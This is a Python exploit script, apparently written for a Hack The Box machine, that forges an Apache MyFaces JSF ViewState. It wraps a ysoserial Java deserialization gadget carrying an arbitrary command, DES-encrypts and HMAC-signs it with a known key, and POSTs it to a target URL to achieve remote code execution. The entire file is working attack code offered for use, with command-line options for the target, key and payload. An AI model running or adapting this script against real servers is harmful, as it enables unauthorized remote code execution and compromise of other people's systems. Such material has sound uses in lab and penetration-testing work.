#!/usr/bin/python3

################################
##
##

import hashlib
import os
import argparse
import base64
import pyDes
import gzip
import hmac
import requests

#https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf
################
#    BASE64    #
################
#  DES + HMAC  #
################
#     GZIP     #
################
# Java Object  #
################
#https://myfaces.apache.org/shared12/myfaces-shared-core/apidocs/org/apache/myfaces/shared/util/StateUtils.html
#ISO-8859-1 is the character set used
#DES is the default encryption algorithm
#ECB is the default mode
#GZIP is used for all compression/decompression.
#Base64 is used for all encoding and decoding.


def cmd_payload(payload, cmd, path):
    payload = os.popen("java -jar {0} {1} ' {2}' | xxd -p | tr -d '\n'".format(path, payload, cmd)).read()
    return payload

def digest(src, key):
    signature = hmac.new(key, src, hashlib.sha1)
    return signature.digest()

def des_encode(src, key):
    k = pyDes.des(key, pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)
    return k.encrypt(src)

def gzip_encode(src):
    return src.encode("zlib")

def send_payload(token, url):
    #proxy = {"http" : "http://127.0.0.1:8080"}
    data = {'j_id_jsp_1623871077_1:email' : 'cube0x0@hackthebox.htb',
            'j_id_jsp_1623871077_1:submit' : 'SIGN UP',
            'j_id_jsp_1623871077_1_SUBMIT' : '1',
            'javax.faces.ViewState' : token
            }
    r = requests.post(url=url, data=data)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--cmd", help="Command to run", dest="cmd", required=True)
    parser.add_argument("-p", "--payload", help="Payload to use", dest="payload", required=True)
    parser.add_argument("-k", "--key", help="Encryption/Sign Key for HMAC(SHA1) and DES", dest="key", required=True)
    parser.add_argument("-P", "--path", help="Path to ysoserial.jar", dest="path", required=True)
    parser.add_argument("-u", "--url", help="Url", dest="url", required=True)
    args = parser.parse_args()

    payload = bytes.fromhex(cmd_payload(args.payload, args.cmd, args.path))
    #jsf_token = gzip_encode(payload) #Server may not use gzip
    jsf_token = des_encode(payload, bytes(args.key,'UTF-8')) 
    jsf_token += digest(jsf_token, bytes(args.key,'UTF-8'))
    jsf_token = base64.b64encode(jsf_token)
    send_payload(jsf_token, args.url)

#############################
##
